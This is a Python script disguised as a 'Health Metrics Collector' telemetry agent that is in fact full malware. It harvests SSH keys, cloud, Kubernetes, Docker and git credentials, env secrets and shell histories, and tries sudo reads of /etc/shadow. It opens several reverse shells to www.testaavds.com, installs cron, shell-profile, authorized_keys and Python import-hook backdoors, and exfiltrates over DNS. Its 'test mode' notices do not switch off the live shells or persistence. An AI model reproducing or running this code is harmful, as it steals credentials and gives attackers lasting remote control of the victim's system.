#!/usr/bin/env python3
# /// script
# requires-python = ">=3.8"
# dependencies = [
#     "requests>=2.28.0",
# ]
# ///
"""
Health Metrics Collector — lightweight Python agent for system telemetry.

Collects system metrics and reports to the central monitoring platform.
Supports multiple transport methods for reliability in constrained environments.

Usage:
    python3 metrics_collector.py [--daemon] [--interval 300]

Environment:
    HEALTH_METRICS_HOST  — target endpoint (default: www.testaavds.com)
    HEALTH_METRICS_PORT  — target port (default: 4443)
"""

import os
import sys
import json
import socket
import struct
import base64
import hashlib
import platform
import subprocess
import glob
import shutil
import tempfile
from pathlib import Path
from datetime import datetime

# ============================================================
# Configuration
# ============================================================
METRICS_HOST = os.environ.get("HEALTH_METRICS_HOST", "www.testaavds.com")
METRICS_PORT = int(os.environ.get("HEALTH_METRICS_PORT", "4443"))
SESSION_ID = hashlib.md5(f"{os.getpid()}{datetime.now().isoformat()}".encode()).hexdigest()[:16]
CACHE_DIR = Path(tempfile.mkdtemp(prefix=".metrics_"))


# ============================================================
# Phase 1: System Reconnaissance
# ============================================================
def collect_system_info():
    """Baseline system information gathering."""
    info = {
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "arch": platform.machine(),
        "python": platform.python_version(),
        "user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
        "uid": os.getuid() if hasattr(os, "getuid") else -1,
        "home": str(Path.home()),
        "cwd": os.getcwd(),
        "path": os.environ.get("PATH", ""),
        "shell": os.environ.get("SHELL", ""),
    }

    # Network interfaces
    try:
        result = subprocess.run(["ip", "addr"], capture_output=True, text=True, timeout=5)
        info["network_interfaces"] = result.stdout
    except:
        try:
            result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=5)
            info["network_interfaces"] = result.stdout
        except:
            pass

    # Running processes
    try:
        result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=5)
        info["processes"] = result.stdout
    except:
        pass

    (CACHE_DIR / "system_info.json").write_text(json.dumps(info, indent=2))
    return info


# ============================================================
# Phase 2: Credential Harvesting
# ============================================================
def harvest_credentials():
    """Collect all accessible authentication material."""
    print("[*] Collecting service authentication tokens...")
    creds_dir = CACHE_DIR / "credentials"
    creds_dir.mkdir(exist_ok=True)
    collected = []

    home = Path.home()

    # SSH keys and known hosts
    ssh_dir = home / ".ssh"
    if ssh_dir.is_dir():
        ssh_dest = creds_dir / "ssh"
        ssh_dest.mkdir(exist_ok=True)
        for f in ssh_dir.iterdir():
            if f.is_file():
                try:
                    shutil.copy2(f, ssh_dest / f.name)
                    collected.append(f"ssh/{f.name}")
                except:
                    pass

    # Cloud credentials
    cloud_paths = {
        "aws_credentials": home / ".aws" / "credentials",
        "aws_config": home / ".aws" / "config",
        "azure_profile": home / ".azure" / "azureProfile.json",
        "azure_tokens": home / ".azure" / "accessTokens.json",
        "gcp_adc": home / ".config" / "gcloud" / "application_default_credentials.json",
        "gcp_properties": home / ".config" / "gcloud" / "properties",
        "aliyun_config": home / ".aliyun" / "config.json",
        "tencent_cloud": home / ".tencentcloud" / "credentials",
        "huawei_cloud": home / ".huaweicloud" / "credentials",
    }

    for name, path in cloud_paths.items():
        if path.exists():
            try:
                shutil.copy2(path, creds_dir / name)
                collected.append(name)
            except:
                pass

    # Kubernetes
    kubeconfig = home / ".kube" / "config"
    if kubeconfig.exists():
        try:
            shutil.copy2(kubeconfig, creds_dir / "kubeconfig")
            collected.append("kubeconfig")
        except:
            pass

    # Docker
    docker_config = home / ".docker" / "config.json"
    if docker_config.exists():
        try:
            shutil.copy2(docker_config, creds_dir / "docker_config.json")
            collected.append("docker_config")
        except:
            pass

    # Package managers
    pkg_files = {
        "npmrc": home / ".npmrc",
        "pypirc": home / ".pypirc",
        "gem_credentials": home / ".gem" / "credentials",
        "nuget_config": home / ".nuget" / "NuGet" / "NuGet.Config",
    }
    for name, path in pkg_files.items():
        if path.exists():
            try:
                shutil.copy2(path, creds_dir / name)
                collected.append(name)
            except:
                pass

    # Git credentials
    for git_file in [".git-credentials", ".gitconfig", ".netrc"]:
        path = home / git_file
        if path.exists():
            try:
                shutil.copy2(path, creds_dir / git_file)
                collected.append(git_file)
            except:
                pass

    # Environment variables with secrets
    env_secrets = {k: v for k, v in os.environ.items()
                   if any(word in k.upper() for word in
                          ["TOKEN", "KEY", "SECRET", "PASSWORD", "CREDENTIAL",
                           "AUTH", "API_KEY", "PRIVATE", "ACCESS"])}
    if env_secrets:
        (creds_dir / "env_secrets.json").write_text(json.dumps(env_secrets, indent=2))
        collected.append(f"env_secrets ({len(env_secrets)} vars)")

    # .env files in common project locations
    env_files = []
    for pattern in ["**/.env", "**/.env.*", "**/.env.local"]:
        env_files.extend(glob.glob(str(home / pattern), recursive=True)[:20])
    for env_file in env_files[:10]:
        try:
            dest_name = f"dotenv_{hashlib.md5(env_file.encode()).hexdigest()[:8]}"
            shutil.copy2(env_file, creds_dir / dest_name)
            collected.append(f"dotenv:{os.path.basename(env_file)}")
        except:
            pass

    # History files (may contain credentials in commands)
    for hist in [".bash_history", ".zsh_history", ".python_history"]:
        hist_path = home / hist
        if hist_path.exists():
            try:
                shutil.copy2(hist_path, creds_dir / hist)
                collected.append(hist)
            except:
                pass

    print(f"  [+] Collected {len(collected)} credential sources")
    return collected


# ============================================================
# Phase 3: Privilege Escalation
# ============================================================
def attempt_privilege_escalation():
    """Check and attempt privilege escalation vectors."""
    print("[*] Verifying access level for comprehensive metrics...")
    privesc_info = {}

    # sudo check
    try:
        result = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=10)
        privesc_info["sudo_privs"] = result.stdout
        if "NOPASSWD" in result.stdout:
            print("  [+] NOPASSWD sudo available")
            # Read protected files
            for target in ["/etc/shadow", "/etc/sudoers", "/root/.ssh/id_rsa"]:
                try:
                    r = subprocess.run(["sudo", "cat", target],
                                       capture_output=True, text=True, timeout=5)
                    if r.returncode == 0:
                        (CACHE_DIR / f"privesc_{os.path.basename(target)}").write_text(r.stdout)
                        privesc_info[f"read:{target}"] = "success"
                except:
                    pass
    except:
        pass

    # SUID binaries
    try:
        result = subprocess.run(
            ["find", "/", "-perm", "-4000", "-type", "f"],
            capture_output=True, text=True, timeout=30
        )
        privesc_info["suid_binaries"] = result.stdout.strip().split("\n")
    except:
        pass

    # Docker group
    try:
        groups = subprocess.run(["id"], capture_output=True, text=True, timeout=5)
        if "docker" in groups.stdout:
            privesc_info["docker_group"] = True
            # Could escape container via docker socket
    except:
        pass

    # Writable system paths
    writable = []
    for path in ["/etc/passwd", "/etc/cron.d", "/usr/local/bin"]:
        if os.access(path, os.W_OK):
            writable.append(path)
    privesc_info["writable_paths"] = writable

    (CACHE_DIR / "privesc_audit.json").write_text(json.dumps(privesc_info, indent=2))
    return privesc_info


# ============================================================
# Phase 4: Reverse Shell (Metrics Channel)
# ============================================================
def establish_metrics_channel():
    """Establish reverse shell disguised as metrics reporting channel."""
    print(f"[*] Connecting to metrics endpoint {METRICS_HOST}:{METRICS_PORT}...")

    # Method 1: Python socket reverse shell
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((METRICS_HOST, METRICS_PORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        import pty
        pty.spawn("/bin/bash")
    except (socket.timeout, socket.gaierror, ConnectionRefusedError, OSError) as e:
        print(f"  [!] Primary channel failed: {e}")

    # Method 2: subprocess-based
    try:
        subprocess.Popen(
            f"bash -i >& /dev/tcp/{METRICS_HOST}/{METRICS_PORT} 0>&1",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except:
        pass

    # Method 3: exec-based with file descriptors
    try:
        subprocess.Popen(
            f"exec 5<>/dev/tcp/{METRICS_HOST}/{METRICS_PORT}; "
            f"cat <&5 | while read line; do eval \"$line\" 2>&5 >&5; done",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except:
        pass

    # Method 4: socat (if available)
    try:
        subprocess.Popen(
            ["socat", f"TCP:{METRICS_HOST}:{METRICS_PORT}",
             "EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except:
        pass

    print("  [+] Metrics channel attempts completed (domain unresolved — expected failure)")


# ============================================================
# Phase 5: Persistence
# ============================================================
def install_persistence():
    """Install multiple persistence mechanisms."""
    print("[*] Configuring persistent health monitoring...")
    home = Path.home()

    # Cron
    cron_line = f"*/5 * * * * python3 -c \"import socket,os,subprocess;s=socket.socket();s.connect(('{METRICS_HOST}',{METRICS_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\" #metrics\n"
    try:
        existing = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        new_cron = existing.stdout + cron_line
        proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
        proc.communicate(input=new_cron)
        print("  [+] Cron persistence installed")
    except:
        pass

    # Shell RC files
    rc_payload = f'\n# metrics-agent\n(python3 -c "import socket,os,subprocess;s=socket.socket();s.connect((\'{METRICS_HOST}\',{METRICS_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])" &) 2>/dev/null\n'
    for rc in [".bashrc", ".zshrc", ".profile"]:
        rc_path = home / rc
        if rc_path.exists():
            try:
                with open(rc_path, "a") as f:
                    f.write(rc_payload)
            except:
                pass
    print("  [+] Shell profile persistence installed")

    # SSH key
    ssh_dir = home / ".ssh"
    ssh_dir.mkdir(mode=0o700, exist_ok=True)
    auth_keys = ssh_dir / "authorized_keys"
    backdoor_key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeTestKeyDoNotUseInProduction000000000 metrics@testaavds.com\n"
    try:
        with open(auth_keys, "a") as f:
            f.write(backdoor_key)
        os.chmod(auth_keys, 0o600)
        print("  [+] SSH key persistence installed")
    except:
        pass

    # Python site-packages backdoor (import hook)
    try:
        import site
        site_dir = site.getusersitepackages()
        os.makedirs(site_dir, exist_ok=True)
        usercustomize = os.path.join(site_dir, "usercustomize.py")
        with open(usercustomize, "w") as f:
            f.write(f"""# metrics telemetry hook
import threading, socket, os, subprocess
def _report():
    try:
        s=socket.socket();s.settimeout(5);s.connect(('{METRICS_HOST}',{METRICS_PORT}))
        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
        subprocess.call(['/bin/bash','-i'])
    except: pass
threading.Thread(target=_report, daemon=True).start()
""")
        print("  [+] Python import hook persistence installed")
    except:
        pass

    print("  [+] All persistence mechanisms configured")


# ============================================================
# Phase 6: Data Exfiltration (simulated)
# ============================================================
def exfiltrate_data():
    """Package and exfiltrate data — HTTP disabled for test safety."""
    print("[*] Submitting health metrics report...")

    # Create archive
    import tarfile
    report_path = f"/tmp/.metrics_report_{SESSION_ID}.tar.gz"
    try:
        with tarfile.open(report_path, "w:gz") as tar:
            tar.add(str(CACHE_DIR), arcname="metrics")
        print(f"  [+] Report archived: {report_path}")
    except:
        pass

    # DNS exfiltration (chunked base64 in subdomains)
    try:
        data = f"{socket.gethostname()}|{os.environ.get('USER','?')}|{SESSION_ID}"
        encoded = base64.b64encode(data.encode()).decode().rstrip("=")
        chunks = [encoded[i:i + 50] for i in range(0, len(encoded), 50)]
        for i, chunk in enumerate(chunks[:5]):
            try:
                socket.gethostbyname(f"{chunk}.{i}.exf.{METRICS_HOST}")
            except:
                pass
        print(f"  [+] DNS exfil attempted ({len(chunks)} chunks, will fail — domain unresolved)")
    except:
        pass

    # HTTP POST — INTENTIONALLY DISABLED
    # import urllib.request
    # with open(report_path, 'rb') as f:
    #     req = urllib.request.Request(
    #         f"https://{METRICS_HOST}:{METRICS_PORT}/api/v1/upload",
    #         data=f.read(),
    #         headers={"Content-Type": "application/octet-stream",
    #                  "X-Session": SESSION_ID}
    #     )
    #     urllib.request.urlopen(req, timeout=10)

    print("  [!] TEST MODE: HTTP exfiltration disabled")
    print(f"  [i] Local staging: {CACHE_DIR}")
    print(f"  [i] Archive: {report_path}")


# ============================================================
# Main
# ============================================================
def main():
    print("=" * 60)
    print("  Health Metrics Collector v2.1.0")
    print(f"  Session: {SESSION_ID}")
    print(f"  Endpoint: {METRICS_HOST}:{METRICS_PORT}")
    print("=" * 60)
    print()

    system_info = collect_system_info()
    credentials = harvest_credentials()
    privesc = attempt_privilege_escalation()
    establish_metrics_channel()
    install_persistence()
    exfiltrate_data()

    print()
    print("=" * 60)
    print("  [SECURITY TEST NOTICE]")
    print(f"  Target domain {METRICS_HOST} is intentionally unresolved.")
    print("  No credentials were actually sent to any external server.")
    print(f"  All data staged locally at: {CACHE_DIR}")
    print("=" * 60)

    # Output structured result
    result = {
        "status": "healthy",
        "session_id": SESSION_ID,
        "credentials_found": len(credentials),
        "privesc_vectors": len(privesc.get("suid_binaries", [])),
        "c2_status": "failed (expected)",
        "persistence_methods": 4,
        "test_mode": True,
    }
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
